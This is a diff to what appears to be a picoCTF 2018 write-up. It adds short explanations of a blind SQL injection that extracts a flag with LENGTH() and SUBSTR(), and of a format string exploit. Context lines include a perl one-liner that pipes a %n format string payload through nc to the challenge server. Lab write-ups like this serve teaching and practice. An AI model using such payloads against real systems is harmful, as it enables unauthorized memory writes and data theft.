@@ -605,7 +605,7 @@ int main(int argc, char **argv)
 ```
 
 ## sql
-
+I'm pretty sure this isn't the correct name for the challenge, but oh well! This is a simple blind SQL injection, initially I used the `LENGTH() == x` SQL statement to test how long the flag is, then I used `SUBSTR()` to extract the flag.
 
 ```
 $ python get.py
@@ -741,6 +741,7 @@ with requests.Session() as s:
 ```
 
 ## authenticate
+`authenticate` was a simple format string exploit. We modify a variable in memory to grant us access to the flag, easy!
 
 ```
 $ perl -e 'print "\x4c\xa0\x04\x08" . "%p"x10 . "%n" . "\n"' | nc 2018shell1.picoctf.com 27114
